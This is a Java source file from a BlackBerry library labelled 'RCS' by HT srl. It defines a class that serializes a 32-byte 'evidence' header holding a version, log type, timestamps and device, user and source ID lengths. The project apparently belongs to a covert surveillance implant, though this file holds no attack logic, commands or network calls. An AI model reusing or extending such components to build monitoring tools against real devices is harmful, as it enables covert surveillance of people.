//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LogDescription.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.evidence;

import net.rim.device.api.util.DataBuffer;
import blackberry.debug.Check;


/**
 * The Class LogDescription.
 */
public final class EvidenceDescription {
    public int version;
    public int logType;
    public int hTimeStamp;
    public int lTimeStamp;

    public int deviceIdLen;
    public int userIdLen;
    public int sourceIdLen;
    public int additionalData;

    public final int length = 32;

    /**
     * Gets the bytes.
     * 
     * @return the bytes
     */
    public byte[] getBytes() {
        final byte[] buffer = new byte[length];
        serialize(buffer, 0);
        //#ifdef DBC
        Check.ensures(buffer.length == length, "Wrong len");
        //#endif
        return buffer;
    }

    /**
     * Serialize.
     * 
     * @param buffer
     *            the buffer
     * @param offset
     *            the offset
     */
    public void serialize(final byte[] buffer, final int offset) {
        final DataBuffer databuffer = new DataBuffer(buffer, offset, length,
                false);
        databuffer.writeInt(version);
        databuffer.writeInt(logType);
        databuffer.writeInt(hTimeStamp);
        databuffer.writeInt(lTimeStamp);

        databuffer.writeInt(deviceIdLen);
        databuffer.writeInt(userIdLen);
        databuffer.writeInt(sourceIdLen);
        databuffer.writeInt(additionalData);

    }
}
